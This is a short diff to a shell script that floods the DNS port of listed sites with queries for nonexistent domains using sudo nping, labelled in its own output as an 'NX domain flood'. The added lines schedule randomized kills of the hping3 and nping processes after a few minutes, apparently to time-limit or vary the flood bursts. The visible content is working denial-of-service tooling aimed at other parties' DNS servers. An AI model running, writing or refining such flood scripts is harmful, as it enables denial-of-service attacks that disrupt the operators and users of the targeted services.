@@ -76,6 +76,9 @@ do
             echo -e "Performing a NX domain flood \r\n "
             sudo nping ${sitelistener[$i]} $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $INEXISTENT_DNS_QUERY > /dev/null 2>&1
             
+            r=`shuf -i 120-600 -n 1`;
+            perl -le "sleep rand $r" && sudo killall -9 hping3 > /dev/null 2>&1 &
+            perl -le "sleep rand $r" && sudo killall -9 nping > /dev/null 2>&1 &
 
         else
             echo "SKIP ${sitelistener[$i]} - not answering on port 53"
